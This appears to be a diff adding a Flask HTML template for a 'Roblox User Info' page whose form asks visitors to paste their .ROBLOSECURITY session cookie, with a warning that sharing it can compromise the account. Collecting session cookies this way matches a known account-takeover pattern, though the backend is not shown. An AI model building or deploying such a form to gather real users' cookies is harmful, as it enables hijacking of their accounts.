@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox User Info</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="background"></div>
+    <div class="container">
+        <h1 class="fade-in">Roblox User Information</h1>
+        <p class="warning slide-in"><strong>WARNING:</strong> Sharing your .ROBLOSECURITY cookie can compromise your account. Use this responsibly.</p>
+        {% if error %}
+            <p class="error slide-in">{{ error }}</p>
+        {% endif %}
+        <form id="cookieForm" class="fade-in" action="/" method="POST">
+            <label for="cookie">Enter .ROBLOSECURITY Cookie</label>
+            <input type="text" id="cookie" name="cookie" required>
+            <button type="submit">Get Info</button>
+        </form>
+    </div>
+    <script src="{{ url_for('static', filename='js/script.js') }}"></script>
+</body>
+</html>
